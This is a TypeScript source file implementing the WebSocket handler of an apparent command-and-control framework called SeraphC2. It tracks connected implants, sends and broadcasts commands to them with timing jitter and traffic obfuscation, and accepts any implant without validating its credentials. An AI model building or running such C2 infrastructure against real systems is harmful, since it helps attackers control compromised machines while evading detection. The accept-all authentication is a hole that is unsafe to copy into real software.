/**
 * WebSocket protocol handler for real-time communication
 * Implements requirements 1.3, 1.4, and 7.9 from the SeraphC2 specification
 */

import { Server as SocketIOServer, Socket } from 'socket.io';
import { Server as HTTPServer } from 'http';
import { BaseProtocolHandler, ProtocolMessage, ProtocolConfig, ConnectionInfo } from './interfaces';
import { Protocol } from '../types/entities';
import { Logger } from '../utils/logger';

export interface WebSocketConfig extends ProtocolConfig {
  corsOrigins: string[];
  path: string;
  transports: string[];
  pingTimeout: number;
  pingInterval: number;
}

export interface ImplantSocket extends Socket {
  implantId?: string;
  authenticated?: boolean;
  connectionInfo?: ConnectionInfo;
}

export class WebSocketHandler extends BaseProtocolHandler {
  private io: SocketIOServer | null = null;
  private httpServer: HTTPServer;
  private implantSockets: Map<string, ImplantSocket>;
  private logger: Logger;
  private wsConfig: WebSocketConfig;

  constructor(httpServer: HTTPServer, config: WebSocketConfig) {
    super(Protocol.WEBSOCKET, config);
    this.httpServer = httpServer;
    this.implantSockets = new Map();
    this.logger = Logger.getInstance();
    this.wsConfig = config;
  }

  /**
   * Start WebSocket server
   */
  async start(): Promise<void> {
    if (this.isRunning) {
      throw new Error('WebSocket handler is already running');
    }

    try {
      this.logger.info('Starting WebSocket protocol handler', {
        port: this.wsConfig.port,
        path: this.wsConfig.path,
      });

      // Initialize Socket.IO server
      this.io = new SocketIOServer(this.httpServer, {
        cors: {
          origin: this.wsConfig.corsOrigins,
          credentials: true,
        },
        path: this.wsConfig.path,
        transports: this.wsConfig.transports as any,
        pingTimeout: this.wsConfig.pingTimeout,
        pingInterval: this.wsConfig.pingInterval,
      });

      this.setupEventHandlers();
      this.isRunning = true;

      this.logger.info('WebSocket protocol handler started successfully');
      this.emit('started');
    } catch (error) {
      this.logger.error('Failed to start WebSocket handler', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
      throw error;
    }
  }

  /**
   * Stop WebSocket server
   */
  async stop(): Promise<void> {
    if (!this.isRunning) {
      return;
    }

    try {
      this.logger.info('Stopping WebSocket protocol handler');

      // Disconnect all implant sockets
      for (const [, socket] of this.implantSockets.entries()) {
        socket.disconnect(true);
      }

      // Close Socket.IO server
      if (this.io) {
        this.io.close();
        this.io = null;
      }

      this.implantSockets.clear();
      this.isRunning = false;

      this.logger.info('WebSocket protocol handler stopped');
      this.emit('stopped');
    } catch (error) {
      this.logger.error('Failed to stop WebSocket handler', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
      throw error;
    }
  }

  /**
   * Send message to specific implant
   */
  async sendMessage(implantId: string, message: ProtocolMessage): Promise<boolean> {
    try {
      const socket = this.implantSockets.get(implantId);
      if (!socket || !socket.connected) {
        this.logger.warn('Implant not connected via WebSocket', { implantId });
        return false;
      }

      // Apply jitter before sending
      await this.applyJitter();

      // Obfuscate traffic if enabled
      const messageData = JSON.stringify(message);
      const obfuscatedData = this.obfuscateTraffic(Buffer.from(messageData));

      // Send message
      socket.emit('message', JSON.parse(obfuscatedData.toString()));

      this.updateStats({
        messagesSent: this.stats.messagesSent + 1,
        bytesSent: this.stats.bytesSent + obfuscatedData.length,
      });

      this.logger.debug('Message sent via WebSocket', {
        implantId,
        messageId: message.id,
        type: message.type,
        size: obfuscatedData.length,
      });

      return true;
    } catch (error) {
      this.logger.error('Failed to send WebSocket message', {
        error: error instanceof Error ? error.message : 'Unknown error',
        implantId,
        messageId: message.id,
      });

      this.updateStats({
        errors: this.stats.errors + 1,
      });

      return false;
    }
  }

  /**
   * Get connection info for implant
   */
  getConnectionInfo(implantId: string): ConnectionInfo | null {
    const socket = this.implantSockets.get(implantId);
    if (!socket || !socket.connectionInfo) {
      return null;
    }

    return socket.connectionInfo;
  }

  /**
   * Check if implant is connected
   */
  isImplantConnected(implantId: string): boolean {
    const socket = this.implantSockets.get(implantId);
    return socket ? socket.connected && socket.authenticated === true : false;
  }

  /**
   * Get all connected implants
   */
  getConnectedImplants(): string[] {
    return Array.from(this.implantSockets.keys()).filter(implantId =>
      this.isImplantConnected(implantId)
    );
  }

  /**
   * Setup Socket.IO event handlers
   */
  private setupEventHandlers(): void {
    if (!this.io) return;

    // Authentication middleware
    this.io.use(async (socket: ImplantSocket, next) => {
      try {
        // Extract implant authentication data
        const { implantId, encryptionKey } = socket.handshake.auth;

        if (!implantId || !encryptionKey) {
          return next(new Error('Authentication data required'));
        }

        // TODO: Validate implant credentials with ImplantManager
        // For now, we'll accept any implant with proper format
        socket.implantId = implantId;
        socket.authenticated = true;

        // Create connection info
        socket.connectionInfo = {
          protocol: Protocol.WEBSOCKET,
          remoteAddress: socket.handshake.address,
          userAgent: socket.handshake.headers['user-agent'] || 'Unknown',
          connectedAt: new Date(),
          lastActivity: new Date(),
          isActive: true,
        };

        this.logger.info('WebSocket implant authenticated', {
          implantId,
          remoteAddress: socket.handshake.address,
        });

        next();
      } catch (error) {
        this.logger.error('WebSocket authentication failed', {
          error: error instanceof Error ? error.message : 'Unknown error',
          socketId: socket.id,
        });
        next(new Error('Authentication failed'));
      }
    });

    // Connection handler
    this.io.on('connection', (socket: ImplantSocket) => {
      if (!socket.implantId || !socket.authenticated) {
        socket.disconnect(true);
        return;
      }

      const implantId = socket.implantId;

      this.logger.info('WebSocket implant connected', {
        implantId,
        socketId: socket.id,
        remoteAddress: socket.handshake.address,
      });

      // Store socket
      this.implantSockets.set(implantId, socket);

      // Update stats
      this.updateStats({
        connectionsTotal: this.stats.connectionsTotal + 1,
        connectionsActive: this.stats.connectionsActive + 1,
      });

      // Emit connection event
      this.emit('implantConnected', {
        implantId,
        connectionInfo: socket.connectionInfo,
      });

      // Handle incoming messages
      socket.on('message', async (data: any) => {
        try {
          const message: ProtocolMessage = data;

          // Update connection activity
          if (socket.connectionInfo) {
            socket.connectionInfo.lastActivity = new Date();
          }

          this.updateStats({
            messagesReceived: this.stats.messagesReceived + 1,
            bytesReceived: this.stats.bytesReceived + JSON.stringify(data).length,
          });

          this.logger.debug('Message received via WebSocket', {
            implantId,
            messageId: message.id,
            type: message.type,
          });

          // Emit message received event
          this.emit('messageReceived', {
            message,
            connectionInfo: socket.connectionInfo,
          });
        } catch (error) {
          this.logger.error('Failed to process WebSocket message', {
            error: error instanceof Error ? error.message : 'Unknown error',
            implantId,
            socketId: socket.id,
          });

          this.updateStats({
            errors: this.stats.errors + 1,
          });
        }
      });

      // Handle heartbeat
      socket.on('heartbeat', (data: any) => {
        try {
          if (socket.connectionInfo) {
            socket.connectionInfo.lastActivity = new Date();
          }

          this.logger.debug('Heartbeat received via WebSocket', {
            implantId,
            timestamp: new Date(),
          });

          this.emit('heartbeatReceived', {
            implantId,
            data,
            connectionInfo: socket.connectionInfo,
          });
        } catch (error) {
          this.logger.error('Failed to process WebSocket heartbeat', {
            error: error instanceof Error ? error.message : 'Unknown error',
            implantId,
          });
        }
      });

      // Handle disconnection
      socket.on('disconnect', (reason: string) => {
        this.logger.info('WebSocket implant disconnected', {
          implantId,
          socketId: socket.id,
          reason,
        });

        // Remove from active sockets
        this.implantSockets.delete(implantId);

        // Update stats
        this.updateStats({
          connectionsActive: Math.max(0, this.stats.connectionsActive - 1),
        });

        // Emit disconnection event
        this.emit('implantDisconnected', {
          implantId,
          reason,
          connectionInfo: socket.connectionInfo,
        });
      });

      // Handle errors
      socket.on('error', (error: Error) => {
        this.logger.error('WebSocket socket error', {
          error: error.message,
          implantId,
          socketId: socket.id,
        });

        this.updateStats({
          errors: this.stats.errors + 1,
        });

        this.emit('socketError', {
          implantId,
          error: error.message,
          connectionInfo: socket.connectionInfo,
        });
      });
    });

    // Handle server errors
    this.io.on('error', (error: Error) => {
      this.logger.error('WebSocket server error', {
        error: error.message,
      });

      this.updateStats({
        errors: this.stats.errors + 1,
      });

      this.emit('serverError', {
        error: error.message,
      });
    });
  }

  /**
   * Broadcast message to all connected implants
   */
  async broadcastMessage(message: ProtocolMessage): Promise<number> {
    let successCount = 0;

    for (const implantId of this.implantSockets.keys()) {
      const success = await this.sendMessage(implantId, message);
      if (success) {
        successCount++;
      }
    }

    return successCount;
  }

  /**
   * Disconnect specific implant
   */
  disconnectImplant(implantId: string, reason: string = 'Server disconnect'): void {
    const socket = this.implantSockets.get(implantId);
    if (socket) {
      socket.disconnect(true);
      this.logger.info('Implant disconnected by server', {
        implantId,
        reason,
      });
    }
  }
}
